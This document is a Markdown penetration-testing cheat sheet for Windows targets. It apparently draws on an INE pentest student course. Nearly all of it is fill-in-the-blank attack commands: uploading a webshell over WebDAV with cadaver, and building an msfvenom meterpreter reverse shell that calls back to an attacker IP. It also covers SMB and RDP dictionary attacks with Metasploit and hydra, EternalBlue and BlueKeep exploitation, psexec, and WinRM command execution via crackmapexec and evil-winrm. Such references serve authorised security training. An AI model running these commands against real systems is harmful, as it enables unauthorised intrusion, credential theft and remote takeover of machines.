# Windows Vulnerabilities

* [Microsoft ISS WebDAV](#microsoft-iss-webdav)
* [SMB](#smb)
* [RDP](#rdp)
* [WinRM](#winrm)
* [References](#references)

******************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
******************************************************************************

## Microsoft ISS WebDAV
```
davtest -url [URL]
```
```
davtest -auth [USERNAME]:[PASSWORD] -url [URL]
```
```
cadaver [URL]
```
Once inside cadaver prompt:
```
put [MALICIOUS-WEBSHELL]
```
Now Check ISS WebDAV via internet browser to perform objectives...

### Metasploit
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -f asp > [FILENAME]
```
Now put payload on target machine by any means (cadaver works well, see command above)  

Next set up and start a listenr:  
```
service postgresql start && msfconsole
```
```
use multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
Set other required options and exploit

#### Automate the above process

```
use exploit/windows/iss/iss_webdav_upload_asp
```
Now set required options and exploit.  
****************************************

## SMB

### Metasploit
```
service postgresql start && msfconsole
```
#### Dictionary Attack
```
search smb_login
```
```
use auxiliary/scanner/smb/smb_login
```
Show options, set them, and exploit the target

#### PSExec Module
```
search psexec
```
```
exploit/windows/smb/psexec
```
Show options, set them, and exploit the target


### PSExec
```
psexec.py [USERNAME]@[TARGET-IP] cmd.exe
```

### Eternal Blue
Check for vulnerability:
```
nmap -sV -p 445 --script=smb-vuln-ms17-010 [TARGET-IP]
```
#### Auto Blue GitHub (Manual Exploit)
https://github.com/3ndG4me/AutoBlue-MS17-010

#### Metasploit
```
search eternalblue
```
Check for vulnerability:
```
use auxiliary/scanner/smb/smb_ms17_010
```
Exploitation:
```
use exploit/windows/smb/ms17_010_eternalblue
```
Show options, set them, and exploit

**************************************

## RDP

### Metasploit

```
search rdp_scanner
```
```
use auxiliary/scanner/rdp/rdp_scanner 
```
show options, set them, and run on target to show RDP info 

#### BlueKeep
```
search BlueKeep
```
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```
show options, set them, and run to show if target is vulnerable to BlueKeep
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```
```
show targets
```
set target to the version of Windows the target machine is running:
```
set target [ID]
```
show options, set them, and exploit the target to get meterpreter shell

### hydra
Dictionary attack:
```
hydra -L [WORDLIST] -P [WORDLIST] rdp://[TARGET-IP] -s [NON-DEFAULT-PORT]
```

### xfreedrp
Login:
```
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET-IP]:[PORT]
```

**************************************

## WinRM

### crackmapexec

Crack Password:
```
crackmapexec [PROTOCOL] [TARGET-IP] -u [USERNAME] -p [WORDLIST]
```

Execute Commands:
```
crackmapexec winrm [TARGET-IP] -u administrator -p [PASSWORD] -x "[COMMAND]"
```

### Obtain Shell with evil-winrm.rb

```
evil-winrm.rb -u [USERNAME] -p '[PASSWORD]' -i [TARGET-IP]
```

### Metasploit

```
search winrm_script
```
```
use exploit/windows/winrm/winrm_script_exec
```
```
set FORCE-VBS true
```
set options, and exploit

**************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2
